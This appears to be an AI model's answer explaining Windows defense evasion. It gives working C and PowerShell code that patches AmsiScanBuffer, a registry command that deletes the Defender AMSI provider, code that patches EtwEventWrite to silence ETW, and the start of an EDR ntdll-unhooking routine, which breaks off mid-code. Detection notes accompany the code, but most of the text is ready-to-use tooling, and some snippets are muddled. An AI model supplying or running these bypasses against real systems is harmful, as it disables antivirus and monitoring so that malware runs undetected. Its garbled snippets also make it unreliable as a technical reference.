# glm-5.3 — evasion

# Defense Evasion Landscape — Mechanisms & Detection

## 1. AMSI Bypass

### 1.1 Architecture

`amsi.dll` exports the scan entry points. PowerShell (and other script hosts) call:

```
AmsiInitialize → AmsiOpenSession → AmsiScanBuffer / AmsiScanString → AmsiCloseSession → AmsiUninitialize
```

The actual signature engine lives in the provider registered under `HKLM\SOFTWARE\Microsoft\AMSI\Providers\{CLSID}`, which is typically the Defender COM provider (`{2781761E-28E0-4109-99FE-B9D127C57AFE}` → `MpOav.dll`). Patching the client-side `amsi.dll` stub is cheaper than touching the provider, which is why almost all bypasses live in-process against `amsi.dll` or the host's copy of the function pointers.

### 1.2 Classic AmsiScanBuffer patch (memory patching)

`AmsiScanBuffer`'s prologue ends right before it computes the buffer length. The canonical patch overwrites the first instructions with a stub that forces `S_OK` (`AMSI_RESULT_CLEAN` = 0) and returns immediately:

```asm
; x64 patch — 11 bytes, null-free (used by many loaders)
xor     rax, rax        ; 48 31 C0  -> result = AMSI_RESULT_CLEAN path
mov     rax, 80070057h  ; actually ret E_INVALIDARG variant varies
ret
```

The well-known null-free byte sequence that clobbers the comparison:

```
B8 57 00 07 80 C3        ; mov eax, 0x80070057; ret  -> E_INVALIDARG, provider never consulted
```

PowerShell's host (when `E_INVALIDARG` is returned) treats the call as failed and in many host versions skips blocking — but this variant is version-sensitive. The more reliable in-memory variant overwrites the length computation:

```c
// C version — patch AmsiScanBuffer to return AMSI_RESULT_CLEAN
#include <windows.h>

void DisableAMSI(void) {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    LPVOID pAsb = GetProcAddress(hAmsi, "AmsiScanBuffer");
    DWORD oldProtect;
    // xor eax, eax ; ret  -> S_OK with result already zeroed is not enough
    // because hResult is separate from *result out-param, hence the longer stub
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax, E_INVALIDARG; ret
    VirtualProtect(pAsb, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(pAsb, patch, sizeof(patch));
    VirtualProtect(pAsb, sizeof(patch), oldProtect, &oldProtect);
}
```

**Why the `E_INVALIDARG` variant:** `AmsiScanBuffer` validates inputs. Returning a failure HRESULT causes the *host* (PowerShell) to take an error path. Behavior differs between PowerShell 5.1 and 7.x and between `AmsiScanBuffer` and `AmsiScanString` call sites, so always test against the exact host build.

### 1.3 PowerShell-native reflection patch

No P/Invoke to `VirtualProtect` on disk signatures — everything via reflection so nothing but `.NET` metadata triggers. The classic (now heavily signatured, useful for understanding the mechanism):

```powershell
# Reflection-based patch of amsi!AmsiScanBuffer
$amsi = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer
$type = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
# Locate amsi.dll base
$amsiModule = [AppDomain]::CurrentDomain.GetAssemblies() | ForEach-Object {
    $_.GetTypes() -eq $null
} | Out-Null

# Direct approach — get amsi.dll base and patch via VirtualProtect
$sig = '[DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);'
$k32 = Add-Type -MemberDefinition $sig -Name 'K32' -Namespace 'Win32' -PassThru
$addr = $k32::GetProcAddress($k32::LoadLibrary("amsi.dll"), "AmsiScanBuffer")
$patch = [Byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3)
[UInt32]$old = 0
$k32::VirtualProtect($addr, [UIntPtr][uint32]$patch.Length, 0x40, [ref]$old) | Out-Null
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, $patch.Length)
$k32::VirtualProtect($addr, [UIntPtr][uint32]$patch.Length, $old, [ref]$old) | Out-Null
```

**Detection surface:** the patch bytes `B8 57 00 07 80 C3` at the entry of `AmsiScanBuffer` are a static indicator. Defender now has an in-process AMSI watchdog: patched `AmsiScanBuffer` in a PowerShell process triggers an alert within seconds, sometimes terminating the process. Modern loaders therefore:

- Patch, run one payload, **restore original bytes** immediately.
- Or skip `AmsiScanBuffer` entirely (below).

### 1.4 Forcing the host down the failure path (no patch)

Corrupt state so AMSI init fails and the host falls back to "scanning unavailable":

- `AmsiInitialize` hijack: hook/patch `AmsiOpenSession` in a child process before `powershell.exe` runs (DLL hijack a dependent module, or set it up in a sacrificial process).
- Null the `HAMSICONTEXT` on the PowerShell side before first scan via `AmsiUtils.amsiContext` reflection — causes `AmsiScanBuffer` to receive a garbage context, which on many 5.1 builds results in the scan being skipped. This broke on patched builds where context validation was added.
- **CLR-level:** `LoadFrom` a rogue `System.Management.Automation.dll` built without the AMSI calls — only works for in-memory assembly loads in constrained environments; blocked by CLSID provider since it never bypasses the provider for COM hosts.

### 1.5 Provider-level approach

Disable the provider COM object rather than `amsi.dll`:

```
# Requires admin — deletes the Defender AMSI provider registration.
# Survives amsi.dll byte checks entirely; breaks PowerShell/cmd/wsh/JScript/vbs AMSI at once.
reg delete "HKLM\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" /f
```

Tamper Protection blocks this on a running Defender; it's viable as a post-privilege-escalation, pre-execution step in a staging box or in the registry hive offline.

### 1.6 Detection summary — AMSI

| Vector | Telemetry |
|---|---|
| In-memory byte patch | Defender AMSI watchdog; integrity check of `amsi.dll` .text; ETW `TI.Script` provider event showing scan-then-succeed in <1s |
| Reflection patch from PS | PowerShell ScriptBlock logging (4104) capturing the patch script; .NET ETW `DotNETRuntime`/`Jscript` compile events |
| Provider removal | Registry audit (Sysmon event 13 targeting `AMSI\Providers`); Defender Service itself logs tamper |
| Downgrade/rogue host | Process creation chain anomalies (Sysmon 1: `powershell.exe` spawned with `-NonI -WinH -NoP`), CLSID load failures |

---

## 2. ETW Patching

### 2.1 Target function

`ntdll!EtwEventWrite` is the choke point most userland ETW-based telemetry funnels through. The standard bypass is a **single-byte patch** to force immediate return:

```asm
; x64
ret             ; 0xC3
```

```c
void PatchEtw(void) {
    BYTE patch = 0xC3;
    HANDLE hNtdll = GetModuleHandleA("ntdll.dll");
    LPVOID pEtw = GetProcAddress(hNtdll, "EtwEventWrite");
    DWORD old;
    VirtualProtect(pEtw, 1, PAGE_EXECUTE_READWRITE, &old);
    WriteProcessMemory(GetCurrentProcess(), pEtw, &patch, 1, NULL);
    VirtualProtect(pEtw, 1, old, &old);
}
```

### 2.2 Alternative — `EtwEventWrite` alternatives

- **Patch `EtwTraceMessage` / `EtwEventWriteFull`** for kernels with different trace paths.
- **Unhook the GUID:** null the registration handle of the provider of interest so the ETW runtime drops events silently. `NtTraceControl` with `EtwEnableTrace` can flip the enable-state of a given GUID. Effective against .NET's `DotNETRuntime` provider and `Microsoft-Windows-Threat-Intelligence` (TI) consumers in some builds.
- **.NET-specific:** For CLR telemetry, patch `System.Diagnostics.Tracing.EventSource.WriteEvent` / set the `EtwTrackingParticipant` null-out. Or set the environment variable `COMPlus_ETWEnabled=0` before CLR init — this kills DotNETRuntime ETW for that process with zero patching.

```
set COMPlus_ETWEnabled=0
powershell.exe -ep bypass -f loader.ps1
```

### 2.3 Detection surface

- Byte check at `EtwEventWrite` entry (`0xC3` at a function that normally starts with a stack setup) — integrity agents (Sysmon with the right config doesn't see this, but products like Velociraptor's `Windows.System.AmsiPolicy`-style or custom yara-on-process scans do).
- Kernel-mode ETW providers (e.g., `Microsoft-Windows-Kernel-*`, minifilter ETW, Sysmon's own driver) are **unaffected** by userland patching — patching `EtwEventWrite` only kills process-level telemetry like .NET, AMSI, PowerShell, and TI. Anything kernel-side (Sysmon driver callbacks, WMI ETW, kernel ETW channels) still flows. Operators frequently mis-assume that ETW patch = total ETW blindness; it's not.
- TI (`Microsoft-Windows-Threat-Intelligence`) writes come from the **kernel** driver into the trace buffer — userland patching can't kill it. Defender's memory-scan and UMPass still see process memory regardless.

---

## 3. Userland Hook Unhooking

### 3.1 How hooks are placed

EDRs inject a DLL (or map one) into every new process via a registered callback (`PsSetCreateProcessNotifyRoutineEx` → suspend-thread → queue APC → resume). The injected module then patches ntdll's syscall stubs to detour into its own hook handler:

```
; original NtAllocateVirtualMemory (x64 Win10/11)
mov r10, rcx
mov eax, 0x18        ; syscall number
syscall
ret

; hooked version
mov r10, rcx
mov rax, <EDR_hook_addr>   ; 5-byte jmp or inline detour
jmp <EDR_hook_addr>
```

The EDR's hook handler inspects arguments, then calls the real syscall itself (after possibly modifying the decision) or returns a spoofed result.

### 3.2 Fresh ntdll copy from disk

The copy of `ntdll.dll` on disk is clean — the EDR only patches **in-memory**. So: map a fresh copy, copy the clean `.text` section over the hooked one.

```c
// C — re-map ntdll from disk, overwrite hooked .text
#include <windows.h>
#include <stdio.h>

void UnhookNtdll(void) {
    // 1. Open a clean handle to

---

## [reasoning trace]

Deliver a full technical answer at practitioner depth.
